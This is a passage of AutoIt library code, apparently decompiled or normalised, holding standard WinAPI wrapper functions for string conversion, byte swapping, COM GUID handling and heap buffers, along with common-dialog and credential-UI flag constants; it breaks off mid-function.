    Func _WinAPI_LoByte($ivalue)
        Return BitAND($ivalue, 0xff)
    EndFunc    ; -> _WinAPI_LoByte

    Func _WinAPI_LoDWord($ivalue)
        Local $tint64 = DllStructCreate("int64")
        Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
        DllStructSetData($tint64, 0x1, $ivalue)
        Return DllStructGetData($tqword, 0x1)
    EndFunc    ; -> _WinAPI_LoDWord

    Func _WinAPI_LoWord($ilong)
        Return BitAND($ilong, 0xffff)
    EndFunc    ; -> _WinAPI_LoWord

    Func _WinAPI_LongMid($ivalue, $ISTART, $icount)
        Return BitAND(BitShift($ivalue, $ISTART), BitOR(BitShift(BitShift(0x7fffffff, 0x20 - ($icount + 0x1)), 0x1), BitShift(0x1, - ($icount + -1))))
    EndFunc    ; -> _WinAPI_LongMid

    Func _WinAPI_MAKELANGID($ilngidprimary, $ilngidsub)
        Return BitOR(BitShift($ilngidsub, + -10), $ilngidprimary)
    EndFunc    ; -> _WinAPI_MAKELANGID

    Func _WinAPI_MAKELCID($ilngid, $isortid)
        Return BitOR(BitShift($isortid, + -16), $ilngid)
    EndFunc    ; -> _WinAPI_MAKELCID

    Func _WinAPI_MakeLong($ilo, $ihi)
        Return BitOR(BitShift($ihi, + -16), BitAND($ilo, 0xffff))
    EndFunc    ; -> _WinAPI_MakeLong

    Func _WinAPI_MakeQWord($ilodword, $ihidword)
        Local $tint64 = DllStructCreate("uint64")
        Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
        DllStructSetData($tdwords, 0x1, $ilodword)
        DllStructSetData($tdwords, 0x2, $ihidword)
        Return DllStructGetData($tint64, 0x1)
    EndFunc    ; -> _WinAPI_MakeQWord

    Func _WinAPI_MakeWord($ilo, $ihi)
        Local $tword = DllStructCreate("ushort")
        Local $tbyte = DllStructCreate("byte;byte", DllStructGetPtr($tword))
        DllStructSetData($tbyte, 0x1, $ihi)
        DllStructSetData($tbyte, 0x2, $ilo)
        Return DllStructGetData($tword, 0x1)
    EndFunc    ; -> _WinAPI_MakeWord

    Func _WinAPI_MultiByteToWideChar($vtext, $icodepage = 0x0, $iflags = 0x0, $bretstring = False)
        Local $stexttype = ''
        If IsString($vtext) Then $stexttype = "str"
        If (IsDllStruct($vtext) Or IsPtr($vtext)) Then $stexttype = "struct*"
        If $stexttype = '' Then Return SetError(0x1, 0x0, 0x0)
        Local $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", + -1, "ptr", 0x0, "int", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $iout = $acall[0x0]
        Local $tout = DllStructCreate("wchar[" & $iout & "]")
        $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", + -1, "struct*", $tout, "int", $iout)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        If $bretstring Then Return DllStructGetData($tout, 0x1)
        Return $tout
    EndFunc    ; -> _WinAPI_MultiByteToWideChar

    Func _WinAPI_MultiByteToWideCharEx($stext, $ptext, $icodepage = 0x0, $iflags = 0x0)
        Local $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", + -1, "struct*", $ptext, "int", (StringLen($stext) + 0x1) * 0x2)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MultiByteToWideCharEx

    Func _WinAPI_OemToChar($sstr)
        Local $acall, $sretstr = '', $nlen = StringLen($sstr) + 0x1, $ISTART = 0x1
        While $ISTART < $nlen
            $acall = DllCall("user32.dll", "bool", "OemToCharA", "str", StringMid($sstr, $ISTART, 0x10000), "str", '')
            If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
            $sretstr &= $acall[0x2]
            $ISTART += 0x10000
        WEnd
        Return $sretstr
    EndFunc    ; -> _WinAPI_OemToChar

    Func _WinAPI_PointFromRect(ByRef $trect, $bcenter = True)
        Local $ix1 = DllStructGetData($trect, "Left")
        Local $iy1 = DllStructGetData($trect, "Top")
        Local $ix2 = DllStructGetData($trect, "Right")
        Local $iy2 = DllStructGetData($trect, "Bottom")
        If $bcenter Then
            $ix1 = $ix1 + (($ix2 - $ix1) / 0x2)
            $iy1 = $iy1 + (($iy2 - $iy1) / 0x2)
        EndIf
        Local $tpoint = DllStructCreate($TAGPOINT)
        DllStructSetData($tpoint, "X", $ix1)
        DllStructSetData($tpoint, "Y", $iy1)
        Return $tpoint
    EndFunc    ; -> _WinAPI_PointFromRect

    Func _WinAPI_PrimaryLangId($ilngid)
        Return BitAND($ilngid, 0x3ff)
    EndFunc    ; -> _WinAPI_PrimaryLangId

    Func _WinAPI_ScreenToClient($hwnd, ByRef $tpoint)
        Local $acall = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ScreenToClient

    Func _WinAPI_ShortToWord($ivalue)
        Return BitAND($ivalue, 0xffff)
    EndFunc    ; -> _WinAPI_ShortToWord

    Func _WinAPI_StrFormatByteSize($isize)
        Local $acall = DllCall("shlwapi.dll", "ptr", "StrFormatByteSizeW", "int64", $isize, "wstr", '', "uint", 0x400)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_StrFormatByteSize

    Func _WinAPI_StrFormatByteSizeEx($isize)
        Local $asymbol = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 0x400, "dword", 0xf, "wstr", '', "int", 0x800)
        If @error Then Return SetError(@error + 0xa, @extended, '')
        Local $ssize = _WinAPI_StrFormatByteSize(0x0)
        If @error Then Return SetError(@error, @extended, '')
        Return StringReplace($ssize, "0", StringRegExpReplace(Number($isize), "(?<=\\d)(?=(\\d{3})+\\z)", $asymbol[0x3]))
    EndFunc    ; -> _WinAPI_StrFormatByteSizeEx

    Func _WinAPI_StrFormatKBSize($isize)
        Local $acall = DllCall("shlwapi.dll", "ptr", "StrFormatKBSizeW", "int64", $isize, "wstr", '', "uint", 0x400)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_StrFormatKBSize

    Func _WinAPI_StrFromTimeInterval($itime, $idigits = 0x7)
        Local $acall = DllCall("shlwapi.dll", "int", "StrFromTimeIntervalW", "wstr", '', "uint", 0x400, "dword", $itime, "int", $idigits)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return StringStripWS($acall[0x1], $STR_STRIPLEADING + $STR_STRIPTRAILING)
    EndFunc    ; -> _WinAPI_StrFromTimeInterval

    Func _WinAPI_StringFromGUID($tguid)
        Local $acall = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", '', "int", 0x28)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x2])
    EndFunc    ; -> _WinAPI_StringFromGUID

    Func _WinAPI_SubLangId($ilngid)
        Return BitShift($ilngid, 0xa)
    EndFunc    ; -> _WinAPI_SubLangId

    Func _WinAPI_SwapDWord($ivalue)
        Local $tstruct1 = DllStructCreate("dword;dword")
        Local $tstruct2 = DllStructCreate("byte[4];byte[4]", DllStructGetPtr($tstruct1))
        DllStructSetData($tstruct1, 0x1, $ivalue)
        For $i = 0x1 To 0x4
            DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x5 - $i), $i)
        Next
        Return DllStructGetData($tstruct1, 0x2)
    EndFunc    ; -> _WinAPI_SwapDWord

    Func _WinAPI_SwapQWord($ivalue)
        Local $tstruct1 = DllStructCreate("int64;int64")
        Local $tstruct2 = DllStructCreate("byte[8];byte[8]", DllStructGetPtr($tstruct1))
        DllStructSetData($tstruct1, 0x1, $ivalue)
        For $i = 0x1 To 0x8
            DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x9 - $i), $i)
        Next
        Return DllStructGetData($tstruct1, 0x2)
    EndFunc    ; -> _WinAPI_SwapQWord

    Func _WinAPI_SwapWord($ivalue)
        Local $tstruct1 = DllStructCreate("word;word")
        Local $tstruct2 = DllStructCreate("byte[2];byte[2]", DllStructGetPtr($tstruct1))
        DllStructSetData($tstruct1, 0x1, $ivalue)
        For $i = 0x1 To 0x2
            DllStructSetData($tstruct2, 0x2, DllStructGetData($tstruct2, 0x1, 0x3 - $i), $i)
        Next
        Return DllStructGetData($tstruct1, 0x2)
    EndFunc    ; -> _WinAPI_SwapWord

    Func _WinAPI_WideCharToMultiByte($vunicode, $icodepage = 0x0, $bretnostruct = True, $bretbinary = False)
        Local $sunicodetype = "wstr"
        If Not IsString($vunicode) Then $sunicodetype = "struct*"
        Local $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0x0, $sunicodetype, $vunicode, "int", + -1, "ptr", 0x0, "int", 0x0, "ptr", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, '')
        Local $tmultibyte = DllStructCreate((($bretbinary) ? ("byte") : ("char")) & "[" & $acall[0x0] & "]")
        $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0x0, $sunicodetype, $vunicode, "int", + -1, "struct*", $tmultibyte, "int", $acall[0x0], "ptr", 0x0, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        If $bretnostruct Then Return DllStructGetData($tmultibyte, 0x1)
        Return $tmultibyte
    EndFunc    ; -> _WinAPI_WideCharToMultiByte

    Func _WinAPI_WordToShort($ivalue)
        If BitAND($ivalue, 0x8000) Then
            Return BitOR($ivalue, -32768)
        EndIf
        Return BitAND($ivalue, 0x7fff)
    EndFunc    ; -> _WinAPI_WordToShort

#EndRegion Public Functions
Global Const $__DLG_WM_USER = 0x400
Global Const $BIF_BROWSEFILEJUNCTIONS = 0x10000
Global Const $BIF_BROWSEFORCOMPUTER = 0x1000
Global Const $BIF_BROWSEFORPRINTER = 0x2000
Global Const $BIF_BROWSEINCLUDEFILES = 0x4000
Global Const $BIF_BROWSEINCLUDEURLS = 0x80
Global Const $BIF_DONTGOBELOWDOMAIN = 0x2
Global Const $BIF_EDITBOX = 0x10
Global Const $BIF_NEWDIALOGSTYLE = 0x40
Global Const $BIF_NONEWFOLDERBUTTON = 0x200
Global Const $BIF_NOTRANSLATETARGETS = 0x400
Global Const $BIF_RETURNFSANCESTORS = 0x8
Global Const $BIF_RETURNONLYFSDIRS = 0x1
Global Const $BIF_SHAREABLE = 0x8000
Global Const $BIF_STATUSTEXT = 0x4
Global Const $BIF_USENEWUI = BitOR($BIF_EDITBOX, $BIF_NEWDIALOGSTYLE)
Global Const $BIF_UAHINT = 0x100
Global Const $BIF_VALIDATE = 0x20
Global Const $BFFM_INITIALIZED = 0x1
Global Const $BFFM_IUNKNOWN = 0x5
Global Const $BFFM_SELCHANGED = 0x2
Global Const $BFFM_VALIDATEFAILED = 0x4
Global Const $BFFM_SETSTATUSTEXTA = $__DLG_WM_USER + 0x64
Global Const $BFFM_ENABLEOK = $__DLG_WM_USER + 0x65
Global Const $BFFM_SETSELECTIONA = $__DLG_WM_USER + 0x66
Global Const $BFFM_SETSELECTIONW = $__DLG_WM_USER + 0x67
Global Const $BFFM_SETSTATUSTEXTW = $__DLG_WM_USER + 0x68
Global Const $BFFM_SETOKTEXT = $__DLG_WM_USER + 0x69
Global Const $BFFM_SETEXPANDED = $__DLG_WM_USER + 0x6a
Global Const $CDERR_DIALOGFAILURE = 0xffff
Global Const $CDERR_FINDRESFAILURE = 0x6
Global Const $CDERR_INITIALIZATION = 0x2
Global Const $CDERR_LOADRESFAILURE = 0x7
Global Const $CDERR_LOADSTRFAILURE = 0x5
Global Const $CDERR_LOCKRESFAILURE = 0x8
Global Const $CDERR_MEMALLOCFAILURE = 0x9
Global Const $CDERR_MEMLOCKFAILURE = 0xa
Global Const $CDERR_NOHINSTANCE = 0x4
Global Const $CDERR_NOHOOK = 0xb
Global Const $CDERR_NOTEMPLATE = 0x3
Global Const $CDERR_REGISTERMSGFAIL = 0xc
Global Const $CDERR_STRUCTSIZE = 0x1
Global Const $PDERR_CREATEICFAILURE = 0x100a
Global Const $PDERR_DEFAULTDIFFERENT = 0x100c
Global Const $PDERR_DNDMMISMATCH = 0x1009
Global Const $PDERR_GETDEVMODEFAIL = 0x1005
Global Const $PDERR_INITFAILURE = 0x1006
Global Const $PDERR_LOADDRVFAILURE = 0x1004
Global Const $PDERR_NODEFAULTPRN = 0x1008
Global Const $PDERR_NODEVICES = 0x1007
Global Const $PDERR_PARSEFAILURE = 0x1002
Global Const $PDERR_PRINTERNOTFOUND = 0x100b
Global Const $PDERR_RETDEFFAILURE = 0x1003
Global Const $PDERR_SETUPFAILURE = 0x1001
Global Const $CFERR_MAXLESSTHANMIN = 0x2002
Global Const $CFERR_NOFONTS = 0x2001
Global Const $FNERR_BUFFERTOOSMALL = 0x3003
Global Const $FNERR_INVALIDFILENAME = 0x3002
Global Const $FNERR_SUBCLASSFAILURE = 0x3001
Global Const $FRERR_BUFFERLENGTHZERO = 0x4001
Global Const $FR_DIALOGTERM = 0x40
Global Const $FR_DOWN = 0x1
Global Const $FR_ENABLEHOOK = 0x100
Global Const $FR_ENABLETEMPLATE = 0x200
Global Const $FR_ENABLETEMPLATEHANDLE = 0x2000
Global Const $FR_FINDNEXT = 0x8
Global Const $FR_HIDEUPDOWN = 0x4000
Global Const $FR_HIDEMATCHCASE = 0x8000
Global Const $FR_HIDEWHOLEWORD = 0x10000
Global Const $FR_MATCHCASE = 0x4
Global Const $FR_NOMATCHCASE = 0x800
Global Const $FR_NOUPDOWN = 0x400
Global Const $FR_NOWHOLEWORD = 0x1000
Global Const $FR_REPLACE = 0x10
Global Const $FR_REPLACEALL = 0x20
Global Const $FR_SHOWHELP = 0x80
Global Const $FR_WHOLEWORD = 0x2
Global Const $SHFMT_ID_DEFAULT = 0xffff
Global Const $SHFMT_OPT_FULL = 0x0
Global Const $SHFMT_OPT_QUICKFORMAT = 0x1
Global Const $SHFMT_OPT_SYSONLY = 0x2
Global Const $SHFMT_ERROR = + -1
Global Const $SHFMT_CANCEL = + -2
Global Const $SHFMT_NOFORMAT = + -3
Global Const $CDM_FIRST = $__DLG_WM_USER + 0x64
Global Const $CDM_GETSPEC = $CDM_FIRST
Global Const $CDM_GETFILEPATH = $CDM_FIRST + 0x1
Global Const $CDM_GETFOLDERPATH = $CDM_FIRST + 0x2
Global Const $CDM_GETFOLDERIDLIST = $CDM_FIRST + 0x3
Global Const $CDM_SETCONTROLTEXT = $CDM_FIRST + 0x4
Global Const $CDM_HIDECONTROL = $CDM_FIRST + 0x5
Global Const $CDM_SETDEFEXT = $CDM_FIRST + 0x6
Global Const $CDM_LAST = $__DLG_WM_USER + 0xc8
Global Const $CDN_FIRST = + -601
Global Const $CDN_INITDONE = $CDN_FIRST
Global Const $CDN_SELCHANGE = $CDN_FIRST + -1
Global Const $CDN_FOLDERCHANGE = $CDN_FIRST + -2
Global Const $CDN_SHAREVIOLATION = $CDN_FIRST + -3
Global Const $CDN_HELP = $CDN_FIRST + -4
Global Const $CDN_FILEOK = $CDN_FIRST + -5
Global Const $CDN_TYPECHANGE = $CDN_FIRST + -6
Global Const $CDN_INCLUDEITEM = $CDN_FIRST + -7
Global Const $CDN_LAST = + -699
Global Const $PSD_DEFAULTMINMARGINS = 0x0
Global Const $PSD_DISABLEMARGINS = 0x10
Global Const $PSD_DISABLEORIENTATION = 0x100
Global Const $PSD_DISABLEPAGEPAINTING = 0x80000
Global Const $PSD_DISABLEPAPER = 0x200
Global Const $PSD_DISABLEPRINTER = 0x20
Global Const $PSD_ENABLEPAGEPAINTHOOK = 0x40000
Global Const $PSD_ENABLEPAGESETUPHOOK = 0x2000
Global Const $PSD_ENABLEPAGESETUPTEMPLATE = 0x8000
Global Const $PSD_ENABLEPAGESETUPTEMPLATEHANDLE = 0x20000
Global Const $PSD_INHUNDREDTHSOFMILLIMETERS = 0x8
Global Const $PSD_INTHOUSANDTHSOFINCHES = 0x4
Global Const $PSD_MARGINS = 0x2
Global Const $PSD_MINMARGINS = 0x1
Global Const $PSD_NONETWORKBUTTON = 0x200000
Global Const $PSD_NOWARNING = 0x80
Global Const $PSD_RETURNDEFAULT = 0x400
Global Const $PSD_SHOWHELP = 0x800
Global Const $WM_PSD_PAGESETUPDLG = $__DLG_WM_USER
Global Const $WM_PSD_FULLPAGERECT = $__DLG_WM_USER + 0x1
Global Const $WM_PSD_MINMARGINRECT = $__DLG_WM_USER + 0x2
Global Const $WM_PSD_MARGINRECT = $__DLG_WM_USER + 0x3
Global Const $WM_PSD_GREEKTEXTRECT = $__DLG_WM_USER + 0x4
Global Const $WM_PSD_ENVSTAMPRECT = $__DLG_WM_USER + 0x5
Global Const $WM_PSD_YAFULLPAGERECT = $__DLG_WM_USER + 0x6
Global Const $PD_ALLPAGES = 0x0
Global Const $PD_COLLATE = 0x10
Global Const $PD_CURRENTPAGE = 0x400000
Global Const $PD_DISABLEPRINTTOFILE = 0x80000
Global Const $PD_ENABLEPRINTHOOK = 0x1000
Global Const $PD_ENABLEPRINTTEMPLATE = 0x4000
Global Const $PD_ENABLEPRINTTEMPLATEHANDLE = 0x10000
Global Const $PD_ENABLESETUPHOOK = 0x2000
Global Const $PD_ENABLESETUPTEMPLATE = 0x8000
Global Const $PD_ENABLESETUPTEMPLATEHANDLE = 0x20000
Global Const $PD_EXCLUSIONFLAGS = 0x1000000
Global Const $PD_HIDEPRINTTOFILE = 0x100000
Global Const $PD_NOCURRENTPAGE = 0x800000
Global Const $PD_NONETWORKBUTTON = 0x200000
Global Const $PD_NOPAGENUMS = 0x8
Global Const $PD_NOSELECTION = 0x4
Global Const $PD_NOWARNING = 0x80
Global Const $PD_PAGENUMS = 0x2
Global Const $PD_PRINTSETUP = 0x40
Global Const $PD_PRINTTOFILE = 0x20
Global Const $PD_RETURNDC = 0x100
Global Const $PD_RETURNDEFAULT = 0x400
Global Const $PD_RETURNIC = 0x200
Global Const $PD_SELECTION = 0x1
Global Const $PD_SHOWHELP = 0x800
Global Const $PD_USEDEVMODECOPIES = 0x40000
Global Const $PD_USEDEVMODECOPIESANDCOLLATE = $PD_USEDEVMODECOPIES
Global Const $PD_USELARGETEMPLATE = 0x10000000
Global Const $PD_RESULT_APPLY = 0x2
Global Const $PD_RESULT_CANCEL = 0x0
Global Const $PD_RESULT_PRINT = 0x1
Global Const $EWX_LOGOFF = 0x0
Global Const $EWX_POWEROFF = 0x8
Global Const $EWX_REBOOT = 0x2
Global Const $EWX_SHUTDOWN = 0x1
Global Const $EWX_FORCE = 0x4
Global Const $EWX_FORCEIFHUNG = 0x10
Global Const $OAIF_ALLOW_REGISTRATION = 0x1
Global Const $OAIF_REGISTER_EXT = 0x2
Global Const $OAIF_EXEC = 0x4
Global Const $OAIF_FORCE_REGISTRATION = 0x8
Global Const $OAIF_HIDE_REGISTRATION = 0x20
Global Const $OAIF_URL_PROTOCOL = 0x40
Global Const $CREDUI_FLAGS_ALWAYS_SHOW_UI = 0x80
Global Const $CREDUI_FLAGS_COMPLETE_USERNAME = 0x800
Global Const $CREDUI_FLAGS_DO_NOT_PERSIST = 0x2
Global Const $CREDUI_FLAGS_EXCLUDE_CERTIFICATES = 0x8
Global Const $CREDUI_FLAGS_EXPECT_CONFIRMATION = 0x20000
Global Const $CREDUI_FLAGS_GENERIC_CREDENTIALS = 0x40000
Global Const $CREDUI_FLAGS_INCORRECT_PASSWORD = 0x1
Global Const $CREDUI_FLAGS_KEEP_USERNAME = 0x100000
Global Const $CREDUI_FLAGS_PASSWORD_ONLY_OK = 0x200
Global Const $CREDUI_FLAGS_PERSIST = 0x1000
Global Const $CREDUI_FLAGS_REQUEST_ADMINISTRATOR = 0x4
Global Const $CREDUI_FLAGS_REQUIRE_CERTIFICATE = 0x10
Global Const $CREDUI_FLAGS_REQUIRE_SMARTCARD = 0x100
Global Const $CREDUI_FLAGS_SERVER_CREDENTIAL = 0x4000
Global Const $CREDUI_FLAGS_SHOW_SAVE_CHECK_BOX = 0x40
Global Const $CREDUI_FLAGS_USERNAME_TARGET_CREDENTIALS = 0x80000
Global Const $CREDUI_FLAGS_VALIDATE_USERNAME = 0x400
Global Const $CREDUIWIN_AUTHPACKAGE_ONLY = 0x10
Global Const $CREDUIWIN_CHECKBOX = 0x2
Global Const $CREDUIWIN_ENUMERATE_ADMINS = 0x100
Global Const $CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200
Global Const $CREDUIWIN_GENERIC = 0x1
Global Const $CREDUIWIN_IN_CRED_ONLY = 0x20
Global Const $CREDUIWIN_SECURE_PROMPT = 0x1000
Global Const $CREDUIWIN_PACK_32_WOW = 0x10000000
Global Const $CREDUIWIN_PREPROMPTING = 0x2000
Global Const $COINIT_APARTMENTTHREADED = 0x2
Global Const $COINIT_DISABLE_OLE1DDE = 0x4
Global Const $COINIT_MULTITHREADED = 0x0
Global Const $COINIT_SPEED_OVER_MEMORY = 0x8
#Region Global Variables and Constants
    Global Const $__TAGWINAPICOM_GUID = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CLSIDFromProgID($sprogid)
        Local $tguid = DllStructCreate($__TAGWINAPICOM_GUID)
        Local $acall = DllCall("ole32.dll", "long", "CLSIDFromProgID", "wstr", $sprogid, "struct*", $tguid)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        $acall = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", '', "int", 0x27)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_CLSIDFromProgID

    Func _WinAPI_CoInitialize($iflags = 0x0)
        Local $acall = DllCall("ole32.dll", "long", "CoInitializeEx", "ptr", 0x0, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_CoInitialize

    Func _WinAPI_CoTaskMemAlloc($isize)
        Local $acall = DllCall("ole32.dll", "ptr", "CoTaskMemAlloc", "uint_ptr", $isize)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CoTaskMemAlloc

    Func _WinAPI_CoTaskMemFree($pmemory)
        DllCall("ole32.dll", "none", "CoTaskMemFree", "ptr", $pmemory)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_CoTaskMemFree

    Func _WinAPI_CoTaskMemRealloc($pmemory, $isize)
        Local $acall = DllCall("ole32.dll", "ptr", "CoTaskMemRealloc", "ptr", $pmemory, "ulong_ptr", $isize)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CoTaskMemRealloc

    Func _WinAPI_CoUninitialize()
        DllCall("ole32.dll", "none", "CoUninitialize")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_CoUninitialize

    Func _WinAPI_CreateGUID()
        Local $tguid = DllStructCreate($__TAGWINAPICOM_GUID)
        Local $acall = DllCall("ole32.dll", "long", "CoCreateGuid", "struct*", $tguid)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        $acall = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", '', "int", 0x10000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_CreateGUID

    Func _WinAPI_CreateStreamOnHGlobal($hglobal = 0x0, $bdeleteonrelease = True)
        Local $acall = DllCall("ole32.dll", "long", "CreateStreamOnHGlobal", "handle", $hglobal, "bool", $bdeleteonrelease, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x3]
    EndFunc    ; -> _WinAPI_CreateStreamOnHGlobal

    Func _WinAPI_GetHGlobalFromStream($pstream)
        Local $acall = DllCall("ole32.dll", "uint", "GetHGlobalFromStream", "ptr", $pstream, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetHGlobalFromStream

    Func _WinAPI_ProgIDFromCLSID($sclsid)
        Local $tguid = DllStructCreate($__TAGWINAPICOM_GUID)
        Local $acall = DllCall("ole32.dll", "uint", "CLSIDFromString", "wstr", $sclsid, "struct*", $tguid)
        If @error Or $acall[0x0] Then Return SetError(@error + 0x14, @extended, '')
        $acall = DllCall("ole32.dll", "uint", "ProgIDFromCLSID", "struct*", $tguid, "ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $sid = _WinAPI_GetString($acall[0x2])
        _WinAPI_CoTaskMemFree($acall[0x2])
        Return $sid
    EndFunc    ; -> _WinAPI_ProgIDFromCLSID

    Func _WinAPI_ReleaseStream($pstream)
        Local $acall = DllCall("oleaut32.dll", "long", "DispCallFunc", "ptr", $pstream, "ulong_ptr", 0x8 * (0x1 + @AutoItX64), "uint", 0x4, "ushort", 0x17, "uint", 0x0, "ptr", 0x0, "ptr", 0x0, "str", '')
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ReleaseStream

#EndRegion Public Functions
#Region Global Variables and Constants
    Global $__g_hheap = 0x0
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CreateBuffer($ilength, $pbuffer = 0x0, $babort = True)
        $pbuffer = __HeapReAlloc($pbuffer, $ilength, 0x0, $babort)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $pbuffer
    EndFunc    ; -> _WinAPI_CreateBuffer

    Func _WinAPI_CreateBufferFromStruct($tstruct, $pbuffer = 0x0, $babort = True)
        If Not IsDllStruct($tstruct) Then Return SetError(0x1, 0x0, 0x0)
        $pbuffer = __HeapReAlloc($pbuffer, DllStructGetSize($tstruct), 0x0, $babort)
        If @error Then Return SetError(@error + 0x64, @extended, 0x0)
        _WinAPI_MoveMemory($pbuffer, $tstruct, DllStructGetSize($tstruct))
        Return $pbuffer
    EndFunc    ; -> _WinAPI_CreateBufferFromStruct

    Func _WinAPI_CreateString($sstring, $pstring = 0x0, $ilength = + -1, $bunicode = True, $babort = True)
        $ilength = Number($ilength)
        If $ilength >= 0x0 Then
            $sstring = StringLeft($sstring, $ilength)
        Else
            $ilength = StringLen($sstring)
        EndIf
        Local $isize = $ilength + 0x1
        If $bunicode Then
            $isize *= 0x2
        EndIf
        $pstring = __HeapReAlloc($pstring, $isize, 0x0, $babort)
        If @error Then Return SetError(@error, @extended, 0x0)
        DllStructSetData(DllStructCreate(($bunicode  ? "wchar"  : "char") & "[" & ($ilength + 0x1) & "]", $pstring), 0x1, $sstring)
        Return SetExtended($ilength, $pstring)
    EndFunc    ; -> _WinAPI_CreateString

    Func _WinAPI_EqualMemory($psource1, $psource2, $ilength)
        If _WinAPI_IsBadReadPtr($psource1, $ilength) Then Return SetError(0xb, @extended, 0x0)
        If _WinAPI_IsBadReadPtr($psource2, $ilength) Then Return SetError(0xc, @extended, 0x0)
        Local $acall = DllCall("ntdll.dll", "ulong_ptr", "RtlCompareMemory", "struct*", $psource1, "struct*", $psource2, "ulong_ptr", $ilength)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return Number($acall[0x0] = $ilength)
    EndFunc    ; -> _WinAPI_EqualMemory

    Func _WinAPI_FillMemory($pmemory, $ilength, $ivalue = 0x0)
        If _WinAPI_IsBadWritePtr($pmemory, $ilength) Then Return SetError(0xb, @extended, 0x0)
        DllCall("ntdll.dll", "none", "RtlFillMemory", "struct*", $pmemory, "ulong_ptr", $ilength, "byte", $ivalue)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_FillMemory

    Func _WinAPI_FreeMemory($pmemory)
        If Not __HeapFree($pmemory, 0x1) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_FreeMemory

    Func _WinAPI_GetMemorySize($pmemory)
        Local $iresult = __HeapSize($pmemory, 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $iresult
    EndFunc    ; -> _WinAPI_GetMemorySize

    Func _WinAPI_GlobalMemoryStatus()
        Local Const $TAGMEMORYSTATUSEX = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"
        Local $tmem = DllStructCreate($TAGMEMORYSTATUSEX)
        DllStructSetData($tmem, 0x1, DllStructGetSize($tmem))
